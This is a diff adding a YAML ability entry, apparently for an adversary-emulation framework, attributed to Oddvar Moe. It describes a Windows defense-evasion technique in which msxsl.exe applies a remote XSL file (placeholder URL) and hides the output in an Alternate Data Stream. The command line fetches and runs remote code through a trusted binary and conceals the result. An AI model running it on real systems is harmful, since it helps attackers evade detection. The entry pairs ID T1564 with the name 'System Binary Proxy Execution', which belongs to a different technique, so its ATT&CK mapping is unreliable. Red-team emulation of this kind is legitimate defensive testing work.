@@ -1,0 +1,23 @@
+- id: c7c73aff-8767-7e09-1bfe-c44df6064d45
+  name: msxsl.exe - Using remote XML and XSL files, save the transformed XML file
+    to an Alternate Data Stream (ADS).
+  description: Using remote XML and XSL files, save the transformed XML file to an
+    Alternate Data Stream (ADS).
+  tactic: defense-evasion
+  technique:
+    attack_id: T1564
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'msxsl.exe #{host.file.path} {REMOTEURL:.xsl} -o #{host.dir.temp}:ads-name'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
